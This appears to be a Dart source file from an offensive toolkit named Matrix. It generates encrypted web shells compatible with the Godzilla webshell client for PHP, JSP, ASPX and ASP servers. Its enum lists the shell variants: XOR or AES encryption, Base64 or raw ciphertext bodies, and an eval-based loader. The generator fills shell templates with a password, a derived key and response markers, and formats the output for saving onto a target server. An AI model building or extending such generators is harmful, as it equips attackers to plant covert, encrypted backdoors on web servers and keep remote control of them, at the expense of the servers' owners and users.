import 'dart:convert';

import '../../core/asset_loader.dart';
import '../../core/crypto/godzilla_crypto.dart';
import 'godzilla_variant.dart';

/// Godzilla 标准马的“加密器”（cryption）——只列 Matrix 连接器支持的变体。
///
/// 名称沿用 Godzilla 的写法，便于对照原版生成器。
enum GodzillaCryption {
  phpXorBase64(
    id: 'PHP_XOR_BASE64',
    language: 'php',
    connectorType: 'php_godzilla',
    asset: 'assets/defaults/payloads/godzilla_shells/php_xor_base64.php.tpl',
    suggestedFileName: 'shell.php',
    note: 'XOR + Base64，密码作参数名，密钥派生 key16',
  ),
  phpXorRaw(
    id: 'PHP_XOR_RAW',
    language: 'php',
    connectorType: 'php_godzilla',
    asset: 'assets/defaults/payloads/godzilla_shells/php_xor_raw.php.tpl',
    suggestedFileName: 'shell.php',
    note: '裸密文 body（无 base64、无标记）',
  ),
  phpEvalXorBase64(
    id: 'PHP_EVAL_XOR_BASE64',
    language: 'php',
    connectorType: 'php_godzilla',
    asset: 'assets/defaults/payloads/godzilla_shells/php_eval_xor_base64.php.tpl',
    suggestedFileName: 'shell.php',
    note: '一句话 eval 壳：每次请求由客户端动态装载，无会话依赖',
  ),
  javaAesBase64(
    id: 'JAVA_AES_BASE64',
    language: 'jsp',
    connectorType: 'jsp_godzilla',
    asset: 'assets/defaults/payloads/godzilla_shells/jsp_aes_base64.jsp.tpl',
    suggestedFileName: 'shell.jsp',
    note: 'AES/ECB + Base64，ClassLoader 载入引擎',
  ),
  javaAesRaw(
    id: 'JAVA_AES_RAW',
    language: 'jsp',
    connectorType: 'jsp_godzilla',
    asset: 'assets/defaults/payloads/godzilla_shells/jsp_aes_raw.jsp.tpl',
    suggestedFileName: 'shell.jsp',
    note: '裸密文 body（无 base64、无标记）',
  ),
  csharpAesBase64(
    id: 'CSHAP_AES_BASE64',
    language: 'aspx',
    connectorType: 'aspx_godzilla',
    asset: 'assets/defaults/payloads/godzilla_shells/aspx_aes_base64.aspx.tpl',
    suggestedFileName: 'shell.aspx',
    note: 'AES/CBC（key=IV）+ Base64，Assembly.Load 载入引擎',
  ),
  csharpAesRaw(
    id: 'CSHAP_AES_RAW',
    language: 'aspx',
    connectorType: 'aspx_godzilla',
    asset: 'assets/defaults/payloads/godzilla_shells/aspx_aes_raw.aspx.tpl',
    suggestedFileName: 'shell.aspx',
    note: '裸密文 body（AES/CBC，key=IV）',
  ),
  aspBase64(
    id: 'ASP_BASE64',
    language: 'asp',
    connectorType: 'asp_godzilla',
    asset: 'assets/defaults/payloads/godzilla_shells/asp_base64.asp.tpl',
    suggestedFileName: 'shell.asp',
    note: '仅 base64，无加密（配合 ASP_BASE64 连接器）',
  ),
  aspRaw(
    id: 'ASP_RAW',
    language: 'asp',
    connectorType: 'asp_godzilla',
    asset: 'assets/defaults/payloads/godzilla_shells/asp_raw.asp.tpl',
    suggestedFileName: 'shell.asp',
    note: '裸 body，无加密、无 base64、无标记',
  ),
  aspXorBase64(
    id: 'ASP_XOR_BASE64',
    language: 'asp',
    connectorType: 'asp_godzilla',
    asset: 'assets/defaults/payloads/godzilla_shells/asp_xor_base64.asp.tpl',
    suggestedFileName: 'shell.asp',
    note: 'XOR + Base64，6 字符响应标记（ASP 无 MD5，标记在生成时固化）',
  ),
  aspXorRaw(
    id: 'ASP_XOR_RAW',
    language: 'asp',
    connectorType: 'asp_godzilla',
    asset: 'assets/defaults/payloads/godzilla_shells/asp_xor_raw.asp.tpl',
    suggestedFileName: 'shell.asp',
    note: '裸密文 body（无 base64、无标记）',
  );

  const GodzillaCryption({
    required this.id,
    required this.language,
    required this.connectorType,
    required this.asset,
    required this.suggestedFileName,
    required this.note,
  });

  final String id;
  final String language;
  final String connectorType;
  final String asset;
  final String suggestedFileName;
  final String note;

  static GodzillaCryption? fromCryptionId(String cryptionId) {
    final id = cryptionId.trim().toUpperCase();
    if (id.isEmpty) return null;
    for (final v in values) {
      if (v.id.toUpperCase() == id) return v;
    }
    return null;
  }

  /// 某架构下的全部加密器。
  static List<GodzillaCryption> forConnector(String connectorType) =>
      values.where((v) => v.connectorType == connectorType).toList();
}

class GodzillaGeneratedShell {
  const GodzillaGeneratedShell({
    required this.cryption,
    required this.password,
    required this.secretKey,
    required this.key16,
    required this.fileName,
    required this.content,
  });

  final GodzillaCryption cryption;
  final String password;
  final String secretKey;
  final String key16;
  final String fileName;
  final String content;

  int get byteLength => utf8.encode(content).length;
}

class GodzillaShellGeneratorException implements Exception {
  GodzillaShellGeneratorException(this.message);
  final String message;
  @override
  String toString() => message;
}

/// 生成 Godzilla 标准马源码。
///
/// 生成的是 **Matrix 自己写的** 协议兼容壳（不是 Godzilla 的模板），
/// 服务端引擎由连接器在首次连接时播种，二者配套使用。
class GodzillaShellGenerator {
  GodzillaShellGenerator._();

  /// 密码会成为 HTTP 参数名，限制为常见安全字符，避免生成出无法解析的壳。
  static final RegExp _passwordPattern = RegExp(r'^[A-Za-z0-9_.\-]{1,64}$');

  static void validatePassword(String password) {
    if (password.isEmpty) {
      throw GodzillaShellGeneratorException('连接密码不能为空');
    }
    if (!_passwordPattern.hasMatch(password)) {
      throw GodzillaShellGeneratorException(
        '连接密码只能包含字母、数字、下划线、点和短横线（1-64 位）',
      );
    }
  }

  static Future<GodzillaGeneratedShell> generate({
    required GodzillaCryption cryption,
    required String password,
    required String secretKey,
  }) async {
    validatePassword(password);
    final key16 = GodzillaCrypto.deriveKey16(secretKey);
    final template = await loadAssetString(cryption.asset);
    if (template.trim().isEmpty) {
      throw GodzillaShellGeneratorException(
        '缺少模板资产 ${cryption.asset}',
      );
    }

    var content = template;
    switch (cryption) {
      case GodzillaCryption.phpXorBase64:
      case GodzillaCryption.phpXorRaw:
        content = content
            .replaceAll('{{PASS}}', _escapeSingleQuoted(password))
            .replaceAll('{{KEY16}}', key16);
      case GodzillaCryption.phpEvalXorBase64:
        // eval 壳把 key 材料放在文件里，请求中的装载器与参数名都不含密钥。
        content = content
            .replaceAll('{{PASS}}', _escapeSingleQuoted(password))
            .replaceAll('{{KEY16}}', key16);
      case GodzillaCryption.javaAesBase64:
      case GodzillaCryption.javaAesRaw:
      case GodzillaCryption.csharpAesBase64:
      case GodzillaCryption.csharpAesRaw:
        content = content
            .replaceAll('{{PASS}}', _escapeDoubleQuoted(password))
            .replaceAll('{{KEY16}}', key16);
      case GodzillaCryption.aspXorBase64:
      case GodzillaCryption.aspXorRaw:
      case GodzillaCryption.aspBase64:
      case GodzillaCryption.aspRaw:
        final markers = GodzillaCrypto.markers(
          password: password,
          key16: key16,
          style: GodzillaMarkerStyle.lowerAsp6,
        );
        content = content
            .replaceAll('{{PASS}}', _escapeDoubleQuoted(password))
            .replaceAll('{{KEY16}}', key16)
            .replaceAll('{{MARK_LEFT}}', markers.left)
            .replaceAll('{{MARK_RIGHT}}', markers.right);
    }

    // Windows 换行更贴近 Godzilla 原版生成结果，也方便直接保存到目标。
    if (!content.contains('\r\n')) {
      content = content.replaceAll('\n', '\r\n');
    }

    return GodzillaGeneratedShell(
      cryption: cryption,
      password: password,
      secretKey: secretKey,
      key16: key16,
      fileName: cryption.suggestedFileName,
      content: content,
    );
  }

  static String _escapeSingleQuoted(String value) =>
      value.replaceAll(r'\', r'\\').replaceAll("'", r"\'");

  static String _escapeDoubleQuoted(String value) =>
      value.replaceAll(r'\', r'\\').replaceAll('"', r'\"');
}
